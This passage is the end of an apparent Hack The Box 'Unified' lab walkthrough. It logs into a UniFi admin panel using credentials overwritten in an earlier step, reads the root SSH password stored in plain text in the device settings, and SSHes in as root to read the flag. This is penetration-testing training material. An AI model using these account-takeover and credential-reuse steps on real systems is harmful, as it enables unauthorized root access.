+</span></span></code></pre></div><blockquote><p>db.admin.update()</p></blockquote><h2 id=task-12><strong>TASK 12</strong><a hidden class=anchor aria-hidden=true href=#task-12>#</a></h2><p><strong>Question</strong>: <em>What is the password for the root user?</em></p><p>It is time to return to the <strong>login page</strong> from TASK2 and use the <strong>credentials</strong> created in TASK11 for the <strong>authentication</strong>.</p><table><thead><tr><th>overwritten credentials</th><th></th></tr></thead><tbody><tr><td><em>username</em></td><td style=text-align:left>administrator</td></tr><tr><td><em>password</em></td><td style=text-align:left>password</td></tr></tbody></table><p>It looks like it worked and we can successfully <strong>log in</strong> as <em>administrator</em>.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_2/unified/admin-login.png alt=admin-login title=admin-login></p><p>From here on out, we simply <strong>rock</strong>, since there are just so <strong>many different ways</strong> to <strong>leverage</strong> this admin config page to get a <strong>root access</strong> on our target machine. Be it by modifying the stored ssh key pair or by using the remote access option.</p><p>The one we are using (probably the quickest one) is to simply <strong>leak</strong> the currently stored <em>root</em> <strong>password</strong>. It can be found under: <em>Settings -> Site -> Device Authentication</em>.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_2/unified/ssh-creds.png alt=ssh-creds title=ssh-creds></p><blockquote><p>NotACrackablePassword4U2022</p></blockquote><h2 id=submit-flag><strong>SUBMIT FLAG</strong><a hidden class=anchor aria-hidden=true href=#submit-flag>#</a></h2><p><strong>Question</strong>: <em>Submit user flag</em></p><p>The <strong>user flag</strong> was already acquired during TASK8.</p><blockquote><p>flag</p></blockquote><h2 id=submit-flag-1><strong>SUBMIT FLAG</strong><a hidden class=anchor aria-hidden=true href=#submit-flag-1>#</a></h2><p><strong>Question</strong>: <em>Submit root flag</em></p><p>Lastly, we use the <strong>leaked credentials</strong> from TASK12 to <strong>open</strong> up an <em><strong>ssh</strong></em> <strong>connection</strong> to our <strong>target</strong>. Once connected, we <strong>grab</strong> the <strong>flag</strong>.</p><table><thead><tr><th>ssh login credentials from TASK12</th><th></th></tr></thead><tbody><tr><td><em>username</em></td><td style=text-align:left>root</td></tr><tr><td><em>password</em></td><td style=text-align:left>NotACrackablePassword4U2022</td></tr></tbody></table><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.41<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-8iyjpno6j2<span class=o>]</span>─<span class=o>[</span>~/unified<span class=o>]</span>
+</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ssh root@<span class=nv>$rhost</span>
+</span></span><span class=line><span class=cl>The authenticity of host <span class=s1>&#39;10.129.157.249 (10.129.157.249)&#39;</span> can<span class=s1>&#39;t be established.
+</span></span></span><span class=line><span class=cl><span class=s1>ECDSA key fingerprint is SHA256:7+5qUqmyILv7QKrQXPArj5uYqJwwe7mpUbzD/7cl44E.
+</span></span></span><span class=line><span class=cl><span class=s1>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span class=line><span class=cl><span class=s1>Warning: Permanently added &#39;</span>10.129.157.249<span class=s1>&#39; (ECDSA) to the list of known hosts.
+</span></span></span><span class=line><span class=cl><span class=s1>root@10.129.157.249&#39;</span>s password: 
+</span></span><span class=line><span class=cl>Welcome to Ubuntu 20.04.3 LTS <span class=o>(</span>GNU/Linux 5.4.0-77-generic x86_64<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> * Documentation:  https://help.ubuntu.com
+</span></span><span class=line><span class=cl> * Management:     https://landscape.canonical.com
+</span></span><span class=line><span class=cl> * Support:        https://ubuntu.com/advantage
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> * Super-optimized <span class=k>for</span> small spaces - <span class=nb>read</span> how we shrank the memory
+</span></span><span class=line><span class=cl>   footprint of MicroK8s to make it the smallest full K8s around.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   https://ubuntu.com/blog/microk8s-memory-optimisation
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>root@unified:~# <span class=nb>pwd</span>
+</span></span><span class=line><span class=cl>/root
+</span></span><span class=line><span class=cl>root@unified:~# ls -hla
+</span></span><span class=line><span class=cl>total 28K
+</span></span><span class=line><span class=cl>drwx------  <span class=m>4</span> root root 4.0K Jan  <span class=m>2</span>  <span class=m>2022</span> .
+</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>19</span> root root 4.0K Jan  <span class=m>2</span>  <span class=m>2022</span> ..
+</span></span><span class=line><span class=cl>lrwxrwxrwx  <span class=m>1</span> root root    <span class=m>9</span> Jan <span class=m>20</span>  <span class=m>2021</span> .bash_history -&gt; /dev/null
+</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root 3.1K Dec  <span class=m>5</span>  <span class=m>2019</span> .bashrc
+</span></span><span class=line><span class=cl>drwx------  <span class=m>2</span> root root 4.0K Jan  <span class=m>2</span>  <span class=m>2022</span> .cache
+</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root  <span class=m>161</span> Dec  <span class=m>5</span>  <span class=m>2019</span> .profile
+</span></span><span class=line><span class=cl>drwx------  <span class=m>2</span> root root 4.0K Jan  <span class=m>2</span>  <span class=m>2022</span> .ssh
+</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root   <span class=m>33</span> Jan  <span class=m>2</span>  <span class=m>2022</span> root.txt
+</span></span><span class=line><span class=cl>root@unified:~# cat root.txt 
+</span></span><span class=line><span class=cl>&lt;flag&gt;
+</span></span><span class=line><span class=cl>root@unified:~# 
+</span></span></code></pre></div><blockquote><p>flag</p></blockquote><p><strong>Congratulations</strong>, we just successfully <strong>pwned</strong> the <strong>target machine</strong>. All we have left to do now is to <strong>terminate</strong> the <strong>target</strong> box (if not terminated automatically) <strong>before</strong> we <strong>continue</strong> with the next box!</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://bluewalle.github.io/tags/htb/>htb</a></li><li><a href=https://bluewalle.github.io/tags/walkthrough/>walkthrough</a></li><li><a href=https://bluewalle.github.io/tags/unified/>unified</a></li><li><a href=https://bluewalle.github.io/tags/tier-2/>tier-2</a></li><li><a href=https://bluewalle.github.io/tags/free-tier/>free-tier</a></li><li><a href=https://bluewalle.github.io/tags/web/>web</a></li><li><a href=https://bluewalle.github.io/tags/vulnerability-assessment/>vulnerability-assessment</a></li><li><a href=https://bluewalle.github.io/tags/databases/>databases</a></li><li><a href=https://bluewalle.github.io/tags/injection/>injection</a></li><li><a href=https://bluewalle.github.io/tags/custom-applications/>custom-applications</a></li><li><a href=https://bluewalle.github.io/tags/outdated-software/>outdated-software</a></li><li><a href=https://bluewalle.github.io/tags/mongodb/>mongodb</a></li><li><a href=https://bluewalle.github.io/tags/java/>java</a></li><li><a href=https://bluewalle.github.io/tags/reconnaissance/>reconnaissance</a></li><li><a href=https://bluewalle.github.io/tags/clear-text-credentials/>clear-text-credentials</a></li><li><a href=https://bluewalle.github.io/tags/default-credentials/>default-credentials</a></li><li><a href=https://bluewalle.github.io/tags/code-injection/>code-injection</a></li></ul></footer></article></main><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>
